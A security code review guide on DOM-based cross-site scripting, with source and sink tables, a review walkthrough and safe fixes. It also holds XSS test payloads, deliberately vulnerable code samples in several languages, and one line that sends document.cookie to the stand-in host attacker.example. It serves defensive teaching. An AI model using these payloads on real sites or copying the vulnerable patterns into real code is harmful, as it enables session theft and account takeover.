---
title: Review DOM XSS
keywords:
  - security code review
  - dom xss
  - cross-site scripting
  - innerHTML
  - client-side xss
description: How to read code for DOM-based cross-site scripting—trace browser-controlled sources into dangerous DOM and JavaScript sinks without server-side reflection.
---

## 4.3 - Review DOM XSS

DOM-based cross-site scripting appears when client-side code reads attacker-controlled data from the browser and writes it into the page or executes it as script. Start from single-page apps, static HTML shells, OAuth callback pages, and postMessage handlers. Trace each source (`location`, storage, messages) into sinks such as `innerHTML`, `document.write`, or `eval`.

## What This Vulnerability Is

DOM XSS is a client-side injection flaw. The server may return a static or minimally dynamic page; the vulnerability lives entirely in front-end JavaScript (or inline script in HTML). Browser-controlled input reaches a dangerous sink without context-appropriate encoding. The attacker crafts a link or fragment; the victim's browser runs the payload when client code processes that input.

Unlike reflected XSS, the malicious string often never appears in the HTTP response body from the server—it may exist only in the URL fragment (`#`), `postMessage` payload, or stored client-side data. Unlike stored XSS, persistence is optional; many DOM XSS bugs are one-click link attacks. This still maps to [CWE-79](https://cwe.mitre.org/data/definitions/79.html) (Improper Neutralization of Input During Web Page Generation).

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | OAuth/OIDC callback pages, client-side routers, “welcome” banners, error toasts, wiki/help viewers, postMessage widgets, client-side search highlighting |
| **Sources** | `location.hash`, `location.search`, `document.URL`, `document.referrer`, `window.name`, `localStorage` / `sessionStorage`, `postMessage` data, WebSocket messages parsed in JS |
| **DOM sinks** | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `document.writeln`, `Range.createContextualFragment` |
| **JS sinks** | `eval`, `Function`, `setTimeout("...", ms)`, `setInterval("...", ms)`, `location` / `location.href` assignment, `javascript:` URLs |
| **Framework sinks** | React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `[innerHTML]`, jQuery `.html()` / `.append()` |
| **Weak controls** | Regex strip of `<script>` only, client-side “sanitizer” without allowlist, trusting `postMessage` origin loosely |

## Attack Payloads

Use these in authorized tests when client code reads URL or message data into DOM or JS sinks. Adjust for hash vs query vs `postMessage` delivery.

### Pattern 1: Fragment (`location.hash`) injection

```text
https://app.example/welcome#bio=<img src=x onerror=alert(1)>
https://app.example/dashboard#name=<svg/onload=alert(1)>
```

### Pattern 2: Query string read by client script

```text
https://app.example/oauth/callback?error_description=<script>alert(1)</script>
https://app.example/search?q=<img src=x onerror=alert(1)>
```

### Pattern 3: JavaScript string breakout (when sink is `eval` or inline script assignment)

```text
#token=';alert(1)//
?json='-alert(1)-'
?name=</script><script>alert(1)</script>
```

### Pattern 4: `postMessage` and storage replay

```javascript
// Authorized test in console on target origin
window.postMessage('<img src=x onerror=alert(1)>', '*');
localStorage.setItem('displayName', '<svg/onload=alert(1)>');
```

### Pattern 5: `javascript:` and navigation sinks

```text
#redirect=javascript:alert(document.domain)
?next=javascript:fetch('https://attacker.example/?c='+document.cookie)
```

### Pattern 6: Filter evasion

```html
<img src=x onerror=alert&#40;1&#41;>
<svg/onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

## Language-Specific Sinks and Dangerous APIs

DOM XSS review is dominated by **JavaScript** and **HTML with embedded script**. Search client bundles, inline `<script>` blocks, and template directives.

### JavaScript (browser)

```javascript
document.getElementById("out").innerHTML = location.hash.slice(1);
document.write(decodeURIComponent(location.search.slice(1)));
eval("handleRedirect('" + params.get("next") + "')");
setTimeout("showBanner('" + userMsg + "')", 0);
element.outerHTML = incomingHtml;
location.href = redirectParam;
$(container).html(storedSnippet);
```

### HTML (inline script and templates)

```html
<script>
  const err = new URLSearchParams(location.search).get("error");
  document.getElementById("msg").innerHTML = err;
</script>

<div id="preview" th:utext="${staticShellOnly}"></div>
<!-- Vue/React mount: v-html / dangerouslySetInnerHTML bound to client-fetched JSON -->
```

### Python (serving vulnerable client shells)

Python often **hosts** the page rather than performing the sink. Flag routes that embed request data into inline script or disable CSP.

```python
return f"""<script>var q = '{request.args.get("q")}';</script>"""
return render_template("app_shell.html")  # review bundled JS for DOM sinks
```

### Java / C# (SPA hosts and Razor/Thymeleaf shells)

```java
// JSP or template passes nothing server-side; static bundle reads location.hash — review .js assets
model.addAttribute("bootConfigJson", userJson); // if rendered unescaped into <script> block
```

```csharp
// Razor: bootstrapping SPA with unencoded JSON in script tag
<script>window.__INITIAL_STATE__ = @Html.Raw(Model.ClientJson);</script>
```

### Go (static file server + template)

```go
// html/template is safe for HTML body; unsafe if template injects into <script> without json.Marshal
fmt.Fprintf(w, `<script>var ref = "%s";</script>`, r.URL.Query().Get("ref"))
```

## Sample Vulnerable Code in Python

```python
from flask import Flask

app = Flask(__name__)

@app.route("/welcome")
def welcome():
    # Static HTML shell; vulnerability is entirely client-side (DOM XSS)
    return """
    <html><body>
      <h1>Welcome</h1>
      <div id="bio"></div>
      <script>
        const params = new URLSearchParams(location.hash.slice(1));
        const bio = params.get("bio") || "";
        // Sink: attacker-controlled fragment written as HTML
        document.getElementById("bio").innerHTML = bio;
      </script>
    </body></html>
    """
```

## Step-by-Step Review Walkthrough

1. **Inventory client sources.** Search for `location`, `document.URL`, `referrer`, `postMessage`, `localStorage`, and `sessionStorage` reads in front-end code and inline scripts.
2. **Trace the Python (or static) delivery path.** In the sample, Flask returns HTML with inline JS. The server does not echo `bio` in the response body; the attacker puts payload in `#bio=...`. Confirm whether security reviewers only audit server templates and miss this path.
3. **Follow each source to sinks.** From `location.hash`, the code calls `innerHTML`. Any HTML payload in the fragment executes in the page origin.
4. **Check routers and OAuth callbacks.** Hash-based tokens and error parameters are high yield. SPAs that parse `window.location` on load are common DOM XSS targets.
5. **Review `postMessage` handlers.** Missing origin checks plus `innerHTML` on `event.data` is a classic bug class.
6. **Inspect framework escape hatches.** `dangerouslySetInnerHTML`, `v-html`, and jQuery `.html()` on client-fetched API data behave like `innerHTML`.
7. **Separate DOM XSS from reflected.** If the server never includes the payload but client JS does, dynamic scanning of HTTP responses alone may miss the flaw—code review and DOM-aware tests matter.

## Risk Impact Analysis

**Session and account abuse.** Script in the application origin can read non-HttpOnly cookies, call authenticated APIs, and perform actions as the victim.

**Token and fragment leakage.** OAuth implicit-flow tokens in the hash combined with DOM XSS can escalate to full account takeover.

**UI redress and phishing.** Attackers inject fake login forms or alter checkout UI within the trusted origin.

**Supply-chain and widget risk.** Third-party scripts that write `postMessage` data to the DOM inherit the page origin's trust.

## Vulnerable Examples in Other Languages

### Java

```java
// Boot page includes script that reads query string on client — audit static resources under /js/
// Server-side anti-pattern: embedding request param in script literal
String script = "<script>var err='" + request.getParameter("err") + "';</script>";
response.getWriter().write(script);
```

### C#

```csharp
// Razor bootstraps client error display from query without encoding in JS context
@Html.Raw($"<script>document.getElementById('e').innerHTML = '{Request.Query["msg"]}';</script>")
```

### JavaScript

```javascript
window.addEventListener("message", (event) => {
  // Missing strict origin check; writes untrusted HTML
  document.getElementById("widget").innerHTML = event.data.html;
});

function renderHighlight(term) {
  const q = new URLSearchParams(location.search).get("q");
  results.innerHTML = `<mark>${q}</mark> ${term}`; // q from URL
}
```

### HTML

```html
<!DOCTYPE html>
<html>
<body>
  <div id="status"></div>
  <script>
    const status = localStorage.getItem("lastStatus") || "";
    document.getElementById("status").innerHTML = status;
  </script>
</body>
</html>
```

### Go

```go
func bootPage(w http.ResponseWriter, r *http.Request) {
    ref := r.URL.Query().Get("ref")
    // Injecting into script/HTML without encoding — often paired with client-side use
    fmt.Fprintf(w, `<html><body><script>window.__ref="%s";</script></body></html>`, ref)
}
```

## Fix: Safer Patterns and Libraries to Use

### JavaScript

Prefer text APIs and framework-default escaping. Never assign URL or message data to `innerHTML`.

```javascript
const params = new URLSearchParams(location.hash.slice(1));
const bio = params.get("bio") || "";
const el = document.getElementById("bio");
el.textContent = bio; // safe for HTML body text display

// Or build nodes explicitly:
const span = document.createElement("span");
span.textContent = bio;
el.replaceChildren(span);
```

**Important:** When you must render a subset of HTML, use a maintained allowlist sanitizer (for example DOMPurify) and still avoid passing URL fragments directly without validation.

```javascript
import DOMPurify from "dompurify";
el.innerHTML = DOMPurify.sanitize(bio, { ALLOWED_TAGS: ["b", "i", "p"] });
```

For `postMessage`, verify origin strictly and treat payload as data, not HTML.

```javascript
window.addEventListener("message", (event) => {
  if (event.origin !== "https://trusted.example") return;
  document.getElementById("widget").textContent = String(event.data.text ?? "");
});
```

### HTML / SPA frameworks

Use default text bindings; avoid HTML bindings for untrusted data.

```jsx
// React — safe default
<div>{bio}</div>

// Only with sanitized HTML:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(bio) }} />
```

```html
<!-- Vue — prefer {{ bio }} over v-html for user content -->
<p>{{ bio }}</p>
```

### Python

Do not embed request parameters in inline script literals. Serve static shells with strict CSP and review bundled JS.

```python
@app.route("/welcome")
def welcome():
    return render_template("welcome.html")  # no inline interpolation of request params
```

Pass initial state as JSON with `json.dumps` and `application/json` script type, or use a dedicated API—never raw string concat into `<script>`.

```python
import json
from markupsafe import Markup

safe_json = Markup(json.dumps({"bio": ""}))  # server-controlled only
return render_template("welcome.html", boot=safe_json)
```

**Important:** `json.dumps` for `<script type="application/json">` blocks is for **server-controlled** data. Client-side code must still avoid writing URL-derived data to DOM sinks.

### Java / C#

Avoid `Html.Raw` / unescaped script bootstrapping of request data. Use encoded JSON blobs and parse with `JSON.parse` on static structure, or keep error text in the HTML body via normal encoding (`th:text`, Razor `@Model.Msg`).

### Go

Use `html/template` for HTML and `json.Marshal` for script bootstrap data—never `fmt.Fprintf` of query params into `<script>`.

## Verify During Review

- Every `location`, storage, and `postMessage` source traced to DOM/JS sinks in client code and inline scripts.
- No `innerHTML`, `document.write`, `eval`, or `dangerouslySetInnerHTML` / `v-html` on attacker-influenced data without vetted sanitization.
- OAuth and callback pages reviewed for hash and query handling on page load.
- CSP restricts inline script where feasible; DOM XSS review still required—CSP is defense in depth.
- Dynamic scanners supplemented with manual `#fragment` and client-route test cases.

## Reference

- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN — Element.innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)
- [MDN — URLSearchParams](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [React — dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [Vue — v-html](https://vuejs.org/api/built-in-directives.html#v-html)
